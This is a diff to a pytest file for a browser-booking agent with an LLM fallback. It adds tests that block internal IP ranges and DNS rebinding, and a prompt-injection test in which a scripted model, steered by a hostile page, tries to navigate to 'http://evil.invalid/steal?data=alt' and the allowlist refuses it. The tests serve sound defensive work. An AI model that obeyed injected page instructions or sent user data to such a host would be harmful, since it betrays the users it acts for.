@@ -36,6 +36,7 @@ def _env(monkeypatch):
     if not os.environ.get("BROWSER_CHROMIUM_PATH") and os.path.exists("/opt/pw-browsers/chromium"):
         monkeypatch.setenv("BROWSER_CHROMIUM_PATH", "/opt/pw-browsers/chromium")
     monkeypatch.setenv("BROWSER_WORKER_ENABLED", "true")
+    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "true")   # the clone listens on 127.0.0.1 (refused outside dev/test)
     get_settings.cache_clear()
     monkeypatch.setattr(orchestrator, "POLL_SECONDS", 0.2)
     yield
@@ -175,7 +176,7 @@ def test_replay_that_finds_another_slot_asks_again_and_confirms_nothing(api, db,
     orchestrator.drive(rid, replay=True, ttl=1)
     run = fresh(db, rid)
     assert run.status == "awaiting_approval" and run.before_after["time"] == "14:00" and not hits(site)
-    drafts = [m for m in msgs(db, tid) if m.kind == "draft"]
+    drafts = [m for m in msgs(db, tid) if m.kind == "booking_proposal"]
     assert len(drafts) == 2 and "Siden har ændret sig" in drafts[-1].text and drafts[-1].answered_option_id is None
     assert run.approved_at is None  # the old yes does not count for the new slot
 
@@ -239,14 +240,14 @@ def test_max_steps_goes_to_the_phone(db, pv, site):
     assert (run.status, run.error_code) == ("fallback_phone", "budget_steps")
 
 
-def test_unknown_engine_without_playbook_goes_to_the_phone_for_now(db, pv, site):
+def test_unknown_engine_goes_to_the_llm_and_a_model_that_gives_up_goes_to_the_phone(db, pv, site):
     tok, tid, rid = new_run(db, pv, site)
     with get_session_factory()() as s:
         s.get(BrowserRun, rid).engine = "unknown"
         s.commit()
     orchestrator.drive(rid)
     run = fresh(db, rid)
-    assert run.status == "fallback_phone" and run.error_code.startswith("playbook:")
+    assert (run.status, run.mode, run.error_code) == ("fallback_phone", "llm", "llm_gave_up")   # the fake provider calls no tool
 
 
 def test_innocent_next_button_that_books_ends_in_awaiting_user_with_a_warning(api, db, pv, site):
@@ -328,3 +329,313 @@ def test_browser_worker_claims_only_browser_events(api, db, pv, site):
     assert ev is not None and ev.event_type == "privat.browser_run" and ev.status == "queued"  # no handler -> retry
     assert ev.last_error and "no handler" in ev.last_error
     assert BrowserSession  # imported: the real handler is bw.HANDLERS
+
+
+# =====================================================================================================================
+# A4: DNS rebinding, video, phone fallback, LLM fallback
+# =====================================================================================================================
+
+def test_allowed_host_pointing_at_an_internal_address_is_refused_before_any_browser_starts(api, db, pv, site, monkeypatch):
+    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "false")      # the real rule: internal addresses are refused
+    get_settings.cache_clear()
+    tok, tid, rid = new_run(db, pv, site)
+    started = []
+    orchestrator.drive(rid, session_factory=lambda snap: started.append(snap) or orchestrator.default_session(snap))
+    run = fresh(db, rid)
+    assert (run.status, run.error_code) == ("failed", "unsafe_target") and not started and not hits(site, "")
+    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "awaiting_user"
+
+
+@pytest.mark.parametrize("ip", ["10.0.0.5", "192.168.1.10", "172.16.0.9", "169.254.169.254", "127.0.0.1", "::1", "fd00::1",
+                                "fe80::1", "100.64.0.1"])
+def test_every_internal_range_is_refused(ip, monkeypatch):
+    from app.core.safe_fetch import FetchBlocked
+
+    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "false")
+    get_settings.cache_clear()
+
+    with pytest.raises(FetchBlocked):
+        orchestrator.resolve_pins(["salon.example"], resolver=lambda host: [ip])
+
+
+def test_one_internal_answer_among_public_ones_is_enough_to_refuse(monkeypatch):
+    from app.core.safe_fetch import FetchBlocked
+
+    monkeypatch.setenv("ALLOW_PRIVATE_FETCH", "false")
+    get_settings.cache_clear()
+
+    with pytest.raises(FetchBlocked):
+        orchestrator.resolve_pins(["salon.example"], resolver=lambda host: ["93.184.216.34", "10.0.0.5"])
+    assert orchestrator.resolve_pins(["salon.example"], resolver=lambda host: ["93.184.216.34"]) == {"salon.example": "93.184.216.34"}
+
+
+def test_the_checked_address_is_pinned_in_chromium(api, db, pv, site, monkeypatch):
+    """`pinned.test` does not exist in DNS. The run only works because Chromium was told to use the address that was
+    resolved and checked before launch (--host-resolver-rules=MAP pinned.test 127.0.0.1)."""
+    tok = pv.account("mette@testmail.dk")
+    tid = uuid.UUID(pv.make_list(tok))
+    run = service.start_run(db, db.get(PrivateTask, tid), goal=GOAL, allowed_domains=["pinned.test"], engine="onlinebooq",
+                            booking_url=f"http://pinned.test:{site.port}/booking/ydelse.html")
+    db.commit()
+    seen = {}
+
+    def factory(snap):
+        seen.update(snap.pins)
+        return orchestrator.default_session(snap)
+
+    t = threading.Thread(target=orchestrator.drive, args=(run.id,), kwargs={
+        "ttl": 30, "resolver": lambda host: ["127.0.0.1"], "session_factory": factory})
+    t.start()
+    wait_for(db, run.id, "awaiting_approval")
+    assert seen == {"pinned.test": "127.0.0.1"} and fresh(db, run.id).before_after["time"] == "10:30"
+    api.post(tok, f"/privat/tasks/{tid}/browser/decline")
+    t.join(20)
+
+
+def test_chromium_args_pin_and_keep_the_dead_proxy():
+    from browser_worker import netguard
+
+    args = netguard.chromium_args(["salon.dk", "127.0.0.1"], {"salon.dk": "93.184.216.34", "v6.dk": "2606:2800::1"})
+    assert "--host-resolver-rules=MAP salon.dk 93.184.216.34,MAP v6.dk [2606:2800::1]" in args
+    assert any(a.startswith("--proxy-server=") for a in args) and "--proxy-bypass-list=<-loopback>;salon.dk;*.salon.dk;127.0.0.1" in args
+    assert not any(a.startswith("--host-resolver-rules") for a in netguard.chromium_args(["127.0.0.1"]))
+
+
+def test_an_unpinned_subdomain_is_checked_when_the_page_uses_it(site, tmp_path):
+    seen = []
+
+    def check(host):
+        seen.append(host)
+        raise OSError("internal")
+
+    with BrowserSession(allowed_domains=["localhost"], workdir=tmp_path, record_video=False, address_check=check) as s:
+        from browser_worker.errors import ToolError
+
+        with pytest.raises(ToolError):
+            s.navigate(f"http://shop.localhost:{site.port}/index.html")
+    assert seen == ["shop.localhost"]
+
+
+def test_video_is_cut_to_max_seconds_uploaded_and_local_files_are_gone(api, db, pv, site, monkeypatch):
+    import shutil
+    import subprocess
+
+    made = []
+
+    def factory(snap):
+        s = orchestrator.default_session(snap)
+        made.append(s)
+        return s
+
+    tok, tid, rid = new_run(db, pv, site)
+    with get_session_factory()() as s:
+        s.get(BrowserRun, rid).max_seconds = 4
+        s.commit()
+    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60, "session_factory": factory})
+    t.start()
+    wait_for(db, rid, "awaiting_approval")
+    time.sleep(6)                                    # the recording keeps running while the user thinks: > max_seconds
+    api.post(tok, f"/privat/tasks/{tid}/browser/decline")
+    t.join(30)
+    run = fresh(db, rid)
+    vids = [e for e in run.evidence_urls if e["kind"] == "video"]
+    assert len(vids) == 1 and "4 sekunder" in vids[0]["name"]
+    local = orchestrator.storage._local_root() / vids[0]["key"]
+    out = subprocess.run([shutil.which("ffprobe"), "-v", "error", "-show_entries", "format=duration", "-of", "csv=p=0", str(local)],
+                         capture_output=True, text=True).stdout.strip()
+    assert 0 < float(out) <= 4.6                     # cut (the cut may land on the next keyframe)
+    assert made[0].workdir is not None and not made[0].workdir.exists()   # screenshots + video deleted locally
+    body = api.get(tok, f"/privat/tasks/{tid}/browser").json()
+    assert any(e["kind"] == "video" and e["url"].startswith("local://") for e in body["evidence"])
+
+
+def test_a_video_that_cannot_be_trimmed_is_not_uploaded(api, db, pv, site, monkeypatch):
+    monkeypatch.setattr(orchestrator.evidence, "ffmpeg_path", lambda: None)
+    tok, tid, rid = new_run(db, pv, site)
+    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60})
+    t.start()
+    wait_for(db, rid, "awaiting_approval")
+    api.post(tok, f"/privat/tasks/{tid}/browser/decline")
+    t.join(30)
+    assert not [e for e in fresh(db, rid).evidence_urls if e["kind"] == "video"]
+
+
+def test_captcha_prepares_the_call_for_the_task(api, db, pv, site):
+    tok, tid, rid = new_run(db, pv, site, variant="booking-captcha")
+    orchestrator.drive(rid)
+    t = api.get(tok, f"/privat/tasks/{tid}").json()
+    assert t["kind"] == "call" and t["status"] == "awaiting_user" and t["call"]["result"] is None
+    assert any(m.kind == "call_proposal" and "sikkerhedskontrol" in m.text for m in msgs(db, tid))
+
+
+# --- LLM fallback ---------------------------------------------------------------------------------------------------
+
+class ScriptedModel:
+    """A stand-in for the provider: replays a plan of tool calls, reading refs out of the tool results it was sent."""
+
+    name, model = "scripted", "claude-opus-5"
+
+    def __init__(self, plan):
+        self.plan, self.i, self.seen_system, self.calls = plan, 0, None, 0
+
+    def complete(self, *, system, messages, max_tokens, tools=None, model=None, effort=None):
+        from app.modules.ai.provider import Completion, ToolCall, Usage
+
+        self.seen_system, self.calls = system, self.calls + 1
+        last = ""
+        if isinstance(messages[-1]["content"], list):
+            last = " ".join(str(b.get("content", "")) for b in messages[-1]["content"])
+        if self.i >= len(self.plan):
+            return Completion(text="Jeg kan ikke komme videre.", stop_reason="end_turn", requested_model="m", served_model="m",
+                              usage=Usage(10, 5))
+        calls = self.plan[self.i](last)
+        self.i += 1
+        calls = calls if isinstance(calls, list) else [calls]
+        tcs = [ToolCall(id=f"t{self.i}_{k}", name=n, input=a) for k, (n, a) in enumerate(calls)]
+        return Completion(text="", stop_reason="tool_use", requested_model="claude-opus-5", served_model="claude-opus-5",
+                          usage=Usage(1000, 100), tool_calls=tcs,
+                          assistant_content=[{"type": "tool_use", "id": t.id, "name": t.name, "input": t.input} for t in tcs])
+
+
+def ref(pattern, role="link"):
+    import re
+
+    def pick(last):
+        m = re.search(rf'\[(e\d+)\] {role} "[^"]*{pattern}', last)
+        assert m, f"no {role} {pattern!r} in {last[:300]!r}"
+        return m.group(1)
+
+    return pick
+
+
+def booking_plan(site, start_variant="booking"):
+    nav = lambda last: ("navigate", {"url": f"{site.url}/{start_variant}/ydelse.html"})  # noqa: E731
+    read = lambda last: ("read_page", {})  # noqa: E731
+    click = lambda pat, role="link": (lambda last: ("click", {"ref": ref(pat, role)(last)}))  # noqa: E731
+    both = lambda last: [("type", {"ref": ref("Navn", "textbox")(last), "text": "Mette Hansen"}),  # noqa: E731
+                         ("type", {"ref": ref("Telefon", "textbox")(last), "text": "+4512345678"})]
+    return [nav, read, click("Herreklip"), read, click("Ingen"), read, click("Tirsdag 10"), read, click("10:30"), read, both,
+            read, click("Fortsæt", "button"), read, click("Bekr", "button")]
+
+
+def llm_run(db, pv, site, *, email="mette@testmail.dk", engine="unknown"):
+    tok, tid, rid = new_run(db, pv, site, email=email, engine=engine) if engine == "onlinebooq" else (None, None, None)
+    if tok is None:
+        tok = pv.account(email)
+        tid = uuid.UUID(pv.make_list(tok))
+        monkey_engines = get_settings().browser_allowed_engines
+        assert monkey_engines
+        run = service.start_run(db, db.get(PrivateTask, tid), goal=GOAL, allowed_domains=["127.0.0.1"], engine="onlinebooq",
+                                booking_url=f"{site.url}/booking/ydelse.html")
+        run.engine = "unknown"        # a site we have no playbook for
+        db.commit()
+        rid = run.id
+    return tok, tid, rid
+
+
+def test_llm_fills_the_form_stops_at_confirm_and_waits_for_the_yes(api, db, pv, site):
+    from app.models import AiUsage
+
+    tok, tid, rid = llm_run(db, pv, site)
+    model = ScriptedModel(booking_plan(site))
+    t = threading.Thread(target=orchestrator.drive, args=(rid,), kwargs={"ttl": 60, "provider": model})
+    t.start()
+    try:
+        wait_for(db, rid, "awaiting_approval", timeout=60)
+        run = fresh(db, rid)
+        assert run.mode == "llm" and not hits(site)                         # parked at the confirm button: nothing booked
+        assert "Mette Hansen" in run.before_after["text"] and "350 kr." in run.before_after["text"]
+        assert 1 <= run.cost_cents <= model.calls                           # cost is recorded (USD cents, rounded up once)
+        assert db.query(AiUsage).filter_by(purpose="browser_agent").count() == model.calls   # every call is logged
+        assert "<side_indhold>" in model.seen_system and "Mette Hansen" not in model.seen_system
+        prop = next(m for m in msgs(db, tid) if m.kind == "booking_proposal")
+        assert "350 kr." in prop.after
+        assert api.post(tok, f"/privat/tasks/{tid}/browser/approve").status_code == 200
+        t.join(40)
+    finally:
+        t.join(1)
+    run = fresh(db, rid)
+    assert run.status == "done" and len(hits(site)) == 1 and run.result["confirmed"] is True
+    assert api.get(tok, f"/privat/tasks/{tid}").json()["status"] == "done"
+
+
+def test_an_llm_run_whose_ttl_ran_out_cannot_be_replayed(api, db, pv, site):
+    tok, tid, rid = llm_run(db, pv, site)
+    orchestrator.drive(rid, ttl=1, provider=ScriptedModel(booking_plan(site)))
+    assert fresh(db, rid).status == "awaiting_approval" and fresh(db, rid).mode == "llm"
+    api.post(tok, f"/privat/tasks/{tid}/browser/approve")
+    ev = next(e for e in db.scalars(select(OutboxEvent).where(OutboxEvent.event_type.in_(BROWSER_EVENT_TYPES)))
+              if e.payload.get("decision") == "approve")
+    db.expire_all()
+    bw.handle_decision(db, ev)
+    db.commit()
+    run = fresh(db, rid)
+    assert (run.status, run.error_code) == ("fallback_phone", "session_expired") and not hits(site)
+
+
+def _remember(store, then):
+    """A plan step that remembers the previous tool result (the page the model just read), then makes its call."""
+    def step(last):
+        store[0] = last
+        return then(store)
+
+    return step
+
+
+def test_prompt_injection_cannot_send_the_llm_elsewhere(api, db, pv, site):
+    """The page tells the model to open a foreign address. The model tries; the code refuses; nothing leaves the domain."""
+    tok, tid, rid = llm_run(db, pv, site)
+    page = [""]
+    plan = [lambda last: ("navigate", {"url": f"{site.url}/booking-evil/ydelse.html"}),
+            lambda last: ("read_page", {}),
+            _remember(page, lambda st: ("navigate", {"url": "http://evil.invalid/steal?data=alt"})),
+            lambda last: ("click", {"ref": ref("Se tilbuddet nu")(page[0])})]
+    model = ScriptedModel(plan)
+    seen_results = []
+    orig = model.complete
+
+    def spy(**kw):
+        if isinstance(kw["messages"][-1]["content"], list):
+            seen_results.append(str(kw["messages"][-1]["content"]))
+        return orig(**kw)
+
+    model.complete = spy
+    orchestrator.drive(rid, provider=model)
+    run = fresh(db, rid)
+    assert run.status == "fallback_phone" and run.error_code == "llm_gave_up", (run.status, run.error_code)
+    assert any("domain_not_allowed" in r for r in seen_results)           # the refusal was handed back to the model
+    assert any("blocked_by_allowlist" in r for r in seen_results)         # ... and so was the link whose target was aborted
+    assert not hits(site, "kvittering")
+
+
+def test_llm_cannot_type_card_numbers(api, db, pv, site):
+    tok, tid, rid = llm_run(db, pv, site)
+    page = [""]
+    plan = [lambda last: ("navigate", {"url": f"{site.url}/booking-felter/kontakt.html"}),
+            lambda last: ("read_page", {}),
+            _remember(page, lambda st: ("type", {"ref": ref("Kortnummer", "textbox")(st[0]), "text": "4111 1111 1111 1111"}))]
+    orchestrator.drive(rid, provider=ScriptedModel(plan))
+    run = fresh(db, rid)
+    assert (run.status, run.error_code) == ("failed", "forbidden_field")
+
+
+def test_without_an_ai_provider_the_llm_fallback_goes_to_the_phone(api, db, pv, site, monkeypatch):
+    tok, tid, rid = llm_run(db, pv, site)
+    monkeypatch.setenv("AI_PROVIDER", "none")
+    get_settings.cache_clear()
+    orchestrator.drive(rid)
+    run = fresh(db, rid)
+    assert (run.status, run.error_code) == ("fallback_phone", "ai_unavailable")
+
+
+def test_a_playbook_miss_hands_over_to_the_llm_from_the_page_it_is_on(api, db, pv, site, monkeypatch):
+    pb = playbooks.get("onlinebooq")
+    monkeypatch.setitem(pb.SELECTORS, "confirm", r"^reserver tiden$")        # a real page words the confirm button differently
+    tok, tid, rid = new_run(db, pv, site)
+    # the playbook filled everything in but does not recognise the summary; the model takes over ON THAT PAGE (shared budget)
+    model = ScriptedModel([lambda last: ("read_page", {}), lambda last: ("click", {"ref": ref("Bekr", "button")(last)})])
+    orchestrator.drive(rid, ttl=1, provider=model)
+    run = fresh(db, rid)
+    assert (run.mode, run.status) == ("llm", "awaiting_approval"), (run.status, run.error_code, run.result)
+    assert not hits(site) and "Herreklip" in run.before_after["text"] and "Mette Hansen" in run.before_after["text"]
+    assert model.calls == 2
